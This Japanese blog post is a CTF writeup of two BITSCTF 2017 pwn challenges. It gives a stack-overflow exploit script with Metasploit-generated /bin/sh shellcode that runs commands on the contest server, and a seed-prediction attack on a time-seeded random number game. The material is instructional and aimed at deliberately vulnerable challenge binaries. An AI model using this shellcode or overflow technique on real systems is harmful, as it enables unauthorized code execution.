---
title: BITSCTF writeup
date: 2017-02-05 21:15:00+0900
tags: CTF
---

[BITSCTF 2017](https://bitsctf.bits-quark.org/) に一人チーム [poepoe](https://bitsctf.bits-quark.org/team/135) でこっそり参加. 50 points で 166 位でした.

キャンプ以来少しずつ勉強してきた pwn の力試しにと登録したのだけど, 開始直後は経験のないジャンルしかなくてすぐ諦めてしまっていた.  
けれどもたまたま今日の夕方見たら2つ追加されてたので急いで解いた.

READMORE

## pwn

### Command\_Line <small>(20pt)</small>

x86-64 の ELF.

    $ file pwn1
    pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af1191f6192afa5c46c4146c085b0d85925a28ce, not stripped
    
    $ gdb pwn1
    Reading symbols from pwn1...(no debugging symbols found)...done.
    gdb-peda$ checksec 
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : disabled
    PIE       : disabled
    RELRO     : Partial

`main()` 関数を見るとこんな感じ.  
親切にもバッファのアドレスを教えてくれた後, `scanf("%s")` でそこに入力を読み取ってるだけのプログラムだった.

    $ r2 -A pwn1
    [x] Analyze all flags starting with sym. and entry0 (aa)
    [x] Analyze len bytes of instructions for references (aar)
    [x] Analyze function calls (aac)
    [ ] [*] Use -AA or aaaa to perform additional experimental analysis.
    [x] Constructing a function name for fcn.* and sym.func.* functions (aan))
     -- Ilo ni li pona li pali e lipu. mi wile e ni: sina kama jo e musi
    [0x00400470]> e asm.nbytes = 0
    [0x00400470]> pdf @ main
                ;-- main:
    / (fcn) sym.main 63
    |   sym.main ();
    |           ; var int local_10h @ rbp-0x10
    |              ; DATA XREF from 0x0040048d (entry0)
    |           0x00400566      push rbp
    |           0x00400567      mov rbp, rsp
    |           0x0040056a      sub rsp, 0x10
    |           0x0040056e      lea rax, qword [rbp - local_10h]
    |           0x00400572      mov rsi, rax
    |           0x00400575      lea rdi, qword str.0x_lx_n                 ; 0x400634 ; str.0x_lx_n ; "0x%lx." @ 0x400634
    |           0x0040057c      mov eax, 0
    |           0x00400581      call sym.imp.printf                       ; int printf(const char *format)
    |           0x00400586      lea rax, qword [rbp - local_10h]
    |           0x0040058a      mov rsi, rax
    |           0x0040058d      lea rdi, qword 0x0040063b                  ; 0x40063b ; "%s"
    |           0x00400594      mov eax, 0
    |           0x00400599      call sym.imp.__isoc99_scanf               ; int scanf(const char *format)
    |           0x0040059e      mov eax, 0
    |           0x004005a3      leave
    \           0x004005a4      ret

`scanf()` で読み込む文字数等を指定していないので Stack buffer overflow が起こせる. Canary も NX bit もないので, リターンアドレスを書き換えて流し込んだシェルコードに飛ばして解いた. 接続がすぐ切れてしまうので, 予め `ls` してファイル名を確認してスクリプトから `cat flag` した.

```python
from pwn import *

# $ gdb pwn1
# Reading symbols from pwn1...(no debugging symbols found)...done.
# gdb-peda$ r
# 0x7fffffffde50
# AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH
#
# Program received signal SIGSEGV, Segmentation fault.
# (...)
# gdb-peda$ x/gx $rsp
# 0x7fffffffde68:	0x413b414144414128
# gdb-peda$ patto 0x413b414144414128
# 4700422384665051432 found at offset: 24
padding = 24

# $ msfconsole
# msf > use payload/linux/x64/exec 
# msf payload(exec) > generate -b '\x00' -t python -o CMD=/bin/sh
shellcode =  ''
shellcode += '\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05'
shellcode += '\xef\xff\xff\xff\x48\xbb\x53\xf2\xa1\x2c\x3c\xa0\x78'
shellcode += '\x1a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4'
shellcode += '\x39\xc9\xf9\xb5\x74\x1b\x57\x78\x3a\x9c\x8e\x5f\x54'
shellcode += '\xa0\x2b\x52\xda\x15\xc9\x01\x5f\xa0\x78\x52\xda\x14'
shellcode += '\xf3\xc4\x34\xa0\x78\x1a\x7c\x90\xc8\x42\x13\xd3\x10'
shellcode += '\x1a\x05\xa5\xe9\xa5\xda\xaf\x7d\x1a'

# r = process('./pwn1')
r = remote('bitsctf.bits-quark.org', 1330)

addr_buffer = int(r.readline()[:-1], 16)
log.info('addr_buffer: 0x%x' % addr_buffer)

payload = ''
payload += 'A' * padding
payload += p64(addr_buffer + padding + 8)
payload += shellcode
r.sendline(payload)

# r.interactive()
r.sendline('cat flag')
log.success('Flag: %s' % r.recv())
```

    $ python2 exploit.py
    [+] Opening connection to bitsctf.bits-quark.org on port 1330: Done
    [*] addr_buffer: 0x7fffffffe620
    [+] Flag: BITSCTF{b451c_57r416h7_f0rw4rd_5h3llc0d1n6}
    [*] Closed connection to bitsctf.bits-quark.org port 1330

### Random Game <small>(30pt)</small>

同じく x86-64 の ELF.

    $ file third
    third: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c26456447632034ed1ad87d3161adcf72daa6c3, not stripped

`main()` 関数の処理はだいたいこんな感じだった.

1. `srand(time(0))`
2. `rand() & 0xf`
3. `scanf("%d")` して 2 の値と比較
  - 違ってたら `exit(0)`
4. 2-3 を30回繰り返す
5. `./flag` を `open()` -> `read()` -> `printf()`

少し悩んだけど, 乱数の seed に `time(0)` を使ってるので, サーバ側の時間がわかれば乱数を推測できそうなのに気づく.

問題は先程のと同じサーバで動いていると予測. まずは先程のスクリプトを使って `date +%s` を実行し, 手元の環境の時間と大きなズレがないことを確認.  
(注: この結果は後から実行したもの)

    $ date +%s ; python2 exploit.py
    1486292363
    [+] Opening connection to bitsctf.bits-quark.org on port 1330: Done
    [*] addr_buffer: 0x7fffffffe620
    [+] date +%s: 1486292363
    [*] Closed connection to bitsctf.bits-quark.org port 1330

あとは問題と同じ方法で30個の乱数を作る C のコードと問題を解くスクリプトを書いて終わり.

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
  srand(time(0));

  for (int i = 0; i < 30; ++i) {
    printf("%d ", rand() & 0xf);
  }
}
```

```ruby
require 'socket'

s = TCPSocket.new 'bitsctf.bits-quark.org', 1337

randnums = `./rand30`.split

30.times do |n|
  print s.gets 'round : '
  s.puts randnums[n]
  puts randnums[n]
end

puts s.gets
```

    $ clang rand30.c -o rand30
    
    $ ruby solve.rb
    your number for 1 round : 8
    your number for 2 round : 4
    your number for 3 round : 9
    your number for 4 round : 10
    your number for 5 round : 9
    your number for 6 round : 4
    your number for 7 round : 6
    your number for 8 round : 6
    your number for 9 round : 3
    your number for 10 round : 5
    your number for 11 round : 15
    your number for 12 round : 13
    your number for 13 round : 12
    your number for 14 round : 3
    your number for 15 round : 15
    your number for 16 round : 2
    your number for 17 round : 7
    your number for 18 round : 5
    your number for 19 round : 6
    your number for 20 round : 8
    your number for 21 round : 14
    your number for 22 round : 2
    your number for 23 round : 12
    your number for 24 round : 12
    your number for 25 round : 14
    your number for 26 round : 8
    your number for 27 round : 13
    your number for 28 round : 4
    your number for 29 round : 3
    your number for 30 round : 13
    congrats you are rewarded with the flag BITSCTF{54m3_533d_54m3_53qu3nc

なぜか Flag が最後まで送られてこない... 最後のワードを補完して `BITSCTF{54m3_533d_54m3_53qu3nc3}` で通った.
